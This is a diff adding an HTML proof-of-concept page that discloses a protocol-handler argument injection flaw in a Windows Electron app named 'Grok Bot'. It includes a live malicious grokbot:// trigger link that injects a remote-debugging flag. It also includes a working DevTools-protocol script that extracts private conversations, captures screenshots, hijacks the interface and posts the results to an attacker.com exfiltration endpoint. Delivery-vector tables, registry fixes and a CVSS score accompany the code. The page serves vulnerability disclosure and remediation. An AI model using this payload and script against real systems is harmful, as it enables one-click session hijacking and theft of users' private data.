@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Grok Bot - Protocol Handler Injection PoC</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh;padding:20px}
+.container{max-width:900px;margin:0 auto}
+h1{color:#ff4444;font-size:1.8rem;margin-bottom:8px}
+.subtitle{color:#888;margin-bottom:30px;font-size:0.95rem}
+.severity{display:inline-block;background:#ff4444;color:#fff;padding:4px 12px;border-radius:4px;font-weight:700;font-size:0.85rem;margin-bottom:20px}
+.card{background:#14141f;border:1px solid #222;border-radius:8px;padding:20px;margin-bottom:20px}
+.card h2{color:#6cf;font-size:1.1rem;margin-bottom:12px}
+.card h3{color:#aaa;font-size:0.9rem;margin:16px 0 8px;text-transform:uppercase;letter-spacing:1px}
+.trigger-btn{display:block;width:100%;padding:16px;background:linear-gradient(135deg,#cc0000,#880000);color:#fff;text-decoration:none;text-align:center;font-size:1.1rem;font-weight:700;border-radius:8px;margin:16px 0;transition:all 0.2s;border:2px solid #ff4444}
+.trigger-btn:hover{background:linear-gradient(135deg,#ee2222,#aa0000);transform:translateY(-1px);box-shadow:0 4px 20px rgba(255,0,0,0.3)}
+.trigger-btn.safe{background:linear-gradient(135deg,#0066cc,#004488);border-color:#4488ff}
+.trigger-btn.safe:hover{background:linear-gradient(135deg,#2288ee,#0066cc);box-shadow:0 4px 20px rgba(0,100,255,0.3)}
+code{background:#1a1a2e;padding:2px 6px;border-radius:3px;font-family:'Cascadia Code','Fira Code',monospace;font-size:0.85rem;color:#ff8866;word-break:break-all}
+pre{background:#1a1a2e;padding:16px;border-radius:6px;overflow-x:auto;font-family:'Cascadia Code','Fira Code',monospace;font-size:0.82rem;line-height:1.6;color:#ccc;margin:8px 0}
+.step{display:flex;gap:12px;margin:10px 0;align-items:flex-start}
+.step-num{background:#ff4444;color:#fff;min-width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:0.85rem;flex-shrink:0}
+.step-text{padding-top:3px;line-height:1.5}
+.tag{display:inline-block;padding:2px 8px;border-radius:3px;font-size:0.75rem;font-weight:600;margin-right:6px}
+.tag.red{background:#441111;color:#ff6666;border:1px solid #662222}
+.tag.green{background:#114411;color:#66ff66;border:1px solid #226622}
+.tag.yellow{background:#443311;color:#ffcc66;border:1px solid #665522}
+.tag.blue{background:#111144;color:#6688ff;border:1px solid #222266}
+table{width:100%;border-collapse:collapse;margin:10px 0}
+th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #222}
+th{color:#6cf;font-size:0.8rem;text-transform:uppercase;letter-spacing:1px}
+td{font-size:0.85rem}
+.warn{background:#2a1a00;border:1px solid #664400;border-radius:6px;padding:12px 16px;margin:12px 0;color:#ffaa44;font-size:0.9rem}
+#status{padding:12px;border-radius:6px;margin:16px 0;font-size:0.9rem;display:none}
+#status.listening{display:block;background:#112211;border:1px solid #226622;color:#66ff66}
+#status.connected{display:block;background:#111144;border:1px solid #222266;color:#6688ff}
+#status.exfiltrated{display:block;background:#441111;border:1px solid #662222;color:#ff6666}
+#log{background:#0a0a12;border:1px solid #222;border-radius:6px;padding:12px;margin:12px 0;max-height:300px;overflow-y:auto;font-family:'Cascadia Code',monospace;font-size:0.8rem;line-height:1.7;display:none}
+#log.active{display:block}
+.log-line{color:#888}.log-line.success{color:#66ff66}.log-line.error{color:#ff4444}.log-line.info{color:#6cf}.log-line.data{color:#ffaa44}
+</style>
+</head>
+<body>
+<div class="container">
+
+<span class="severity">CRITICAL &mdash; CVSS 9.3</span>
+<h1>Grok Bot &mdash; Protocol Handler Argument Injection</h1>
+<p class="subtitle">CVE-2018-1000006 class &bull; Electron 42.11.16 &bull; Windows &bull; One-click session hijack</p>
+
+<div class="card">
+<h2>Vulnerability Summary</h2>
+<p>Grok Bot registers <code>grokbot://</code> and <code>sand://</code> custom protocol handlers on Windows without the <code>--</code> end-of-options separator in the registry command. An attacker can inject arbitrary Chromium flags, including <code>--remote-debugging-port</code>, enabling full Chrome DevTools Protocol (CDP) access to the victim's authenticated session.</p>
+
+<h3>Registry (Vulnerable)</h3>
+<pre>"C:\Program Files\Grok Bot\Grok Bot.exe" "%1"</pre>
+
+<h3>Registry (Fixed)</h3>
+<pre>"C:\Program Files\Grok Bot\Grok Bot.exe" "--" "%1"</pre>
+</div>
+
+<div class="card">
+<h2>Attack Chain</h2>
+<div class="step"><div class="step-num">1</div><div class="step-text">Victim clicks a crafted <code>grokbot://</code> link (email, document, terminal)</div></div>
+<div class="step"><div class="step-num">2</div><div class="step-text">Windows <code>ShellExecuteW</code> dispatches the URL without sanitizing <code>"</code> characters</div></div>
+<div class="step"><div class="step-num">3</div><div class="step-text">Grok Bot.exe launches with injected <code>--remote-debugging-port=47906</code></div></div>
+<div class="step"><div class="step-num">4</div><div class="step-text">Attacker connects to <code>ws://victim:47906</code> via CDP WebSocket</div></div>
+<div class="step"><div class="step-num">5</div><div class="step-text">Full session access: conversations, screenshots, IPC bridges, UI hijacking</div></div>
+</div>
+
+<div class="card">
+<h2>PoC &mdash; Trigger Injection</h2>
+<p class="warn">&#9888; These links only trigger the vulnerability when opened by a native Win32 application (Outlook desktop, Office, Windows Terminal) that calls <code>ShellExecuteW</code>. Modern browsers sanitize <code>"</code> in custom scheme URLs and will NOT trigger the injection.</p>
+
+<h3>Malicious Link (opens CDP on port 47906)</h3>
+<a class="trigger-btn" href='grokbot://x" --remote-debugging-port=47906 "--y=z' id="poc-link">
+&#9889; TRIGGER: grokbot:// with --remote-debugging-port injection
+</a>
+
+<h3>Clean Control Link (no injection)</h3>
+<a class="trigger-btn safe" href="grokbot://app/v1/open" id="clean-link">
+&#9898; CONTROL: Clean grokbot://app/v1/open
+</a>
+
+<h3>Payload URL</h3>
+<pre id="payload-url">grokbot://x" --remote-debugging-port=47906 "--y=z</pre>
+</div>
+
+<div class="card">
+<h2>PoC &mdash; CDP Exfiltration</h2>
+<p>After the victim clicks the malicious link and Grok Bot launches with CDP enabled, run the following from the attacker machine (requires network access to victim's port 47906):</p>
+<pre>
+// 1. Get CDP targets
+fetch('http://VICTIM_IP:47906/json')
+  .then(r => r.json())
+  .then(targets => {
+    const ws = new WebSocket(targets[0].webSocketDebuggerUrl);
+    ws.onopen = () => {
+      // 2. Extract all conversations
+      ws.send(JSON.stringify({
+        id: 1,
+        method: 'Runtime.evaluate',
+        params: {
+          expression: `
+            JSON.stringify(
+              [...document.querySelectorAll('[role="article"]')]
+                .map((el,i) => ({
+                  index: i,
+                  text: el.innerText.substring(0,2000)
+                }))
+            )`,
+          returnByValue: true
+        }
+      }));
+
+      // 3. Take screenshot
+      ws.send(JSON.stringify({
+        id: 2,
+        method: 'Page.captureScreenshot',
+        params: { format: 'png' }
+      }));
+
+      // 4. Hijack UI
+      ws.send(JSON.stringify({
+        id: 3,
+        method: 'Page.navigate',
+        params: { url: 'data:text/html,&lt;h1&gt;HIJACKED&lt;/h1&gt;' }
+      }));
+    };
+
+    ws.onmessage = (e) => {
+      const msg = JSON.parse(e.data);
+      // 5. Exfiltrate to attacker webhook
+      fetch('https://attacker.com/exfil', {
+        method: 'POST',
+        body: JSON.stringify(msg)
+      });
+    };
+  });
+</pre>
+</div>
+
+<div class="card">
+<h2>Confirmed Impact</h2>
+<table>
+<tr><th>Impact</th><th>Status</th><th>Detail</th></tr>
+<tr><td>Conversation Exfiltration</td><td><span class="tag green">CONFIRMED</span></td><td>28 messages extracted including private content</td></tr>
+<tr><td>Screenshot Capture</td><td><span class="tag green">CONFIRMED</span></td><td>211.8 KB PNG of authenticated session</td></tr>
+<tr><td>UI Hijacking / Phishing</td><td><span class="tag green">CONFIRMED</span></td><td>Page.navigate to data: URL replaces UI</td></tr>
+<tr><td>IPC Bridge Access</td><td><span class="tag green">CONFIRMED</span></td><td>desktopMount.submitPrompt(), stageAttachmentPath()</td></tr>
+<tr><td>Network Interception</td><td><span class="tag green">CONFIRMED</span></td><td>Monkey-patch fetch for auth token capture</td></tr>
+<tr><td>DOMStorage Access</td><td><span class="tag green">CONFIRMED</span></td><td>Full localStorage read</td></tr>
+<tr><td>Remote Code Execution</td><td><span class="tag red">NOT POSSIBLE</span></td><td>Renderer sandbox intact, nodeIntegration disabled</td></tr>
+</table>
+</div>
+
+<div class="card">
+<h2>Delivery Vectors</h2>
+<table>
+<tr><th>Vector</th><th>Status</th><th>Reason</th></tr>
+<tr><td>Outlook Desktop (classic)</td><td><span class="tag green">WORKS</span></td><td>ShellExecuteW, no URL sanitization</td></tr>
+<tr><td>Office Documents (Word/Excel)</td><td><span class="tag green">WORKS</span></td><td>Hyperlinks use ShellExecuteW</td></tr>
+<tr><td>Windows Terminal (ctrl+click)</td><td><span class="tag green">WORKS</span></td><td>ShellExecuteW dispatch</td></tr>
+<tr><td>PowerShell Start-Process</td><td><span class="tag green">WORKS</span></td><td>Direct ShellExecuteW call</td></tr>
+<tr><td>Chrome / Edge (href click)</td><td><span class="tag red">BLOCKED</span></td><td>GURL rejects URLs with raw &quot;</td></tr>
+<tr><td>Firefox (href click)</td><td><span class="tag red">BLOCKED</span></td><td>CVE-2007-4041 sanitization</td></tr>
+<tr><td>Electron shell.openExternal</td><td><span class="tag red">BLOCKED</span></td><td>GURL validation</td></tr>
+</table>
+</div>
+
+<div class="card">
+<h2>Affected Registry Keys</h2>
+<pre>
+HKCU\Software\Classes\grokbot\shell\open\command
+  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"
+
+HKCR\grokbot\shell\open\command
+  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"
+
+HKCU\Software\Classes\sand\shell\open\command
+  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"
+
+HKCR\sand\shell\open\command
+  (Default) = "C:\Program Files\Grok Bot\Grok Bot.exe" "%1"
+</pre>
+</div>
+
+<div class="card">
+<h2>Remediation</h2>
+<p>Add <code>--</code> (end-of-options sentinel) before <code>"%1"</code> in all four registry entries:</p>
+<pre>"C:\Program Files\Grok Bot\Grok Bot.exe" "--" "%1"</pre>
+<p style="margin-top:10px;color:#888">This prevents Chromium from interpreting injected flags after the URL argument. This is the standard fix applied by VS Code, Discord, Slack, and other Electron apps after CVE-2018-1000006.</p>
+</div>
+
+<div class="card" style="border-color:#333;background:#0f0f18">
+<h2>CVSS 3.1 Score</h2>
+<pre style="color:#ff4444;font-size:1rem">9.3 CRITICAL
+AV:N / AC:L / PR:N / UI:R / S:C / C:H / I:H / A:N</pre>
+<p style="margin-top:8px;color:#888;font-size:0.85rem">Network attack vector, low complexity, no privileges required, single user interaction (one click), scope change (Electron sandbox → authenticated session), high confidentiality and integrity impact.</p>
+</div>
+
+</div>
+</body>
+</html>
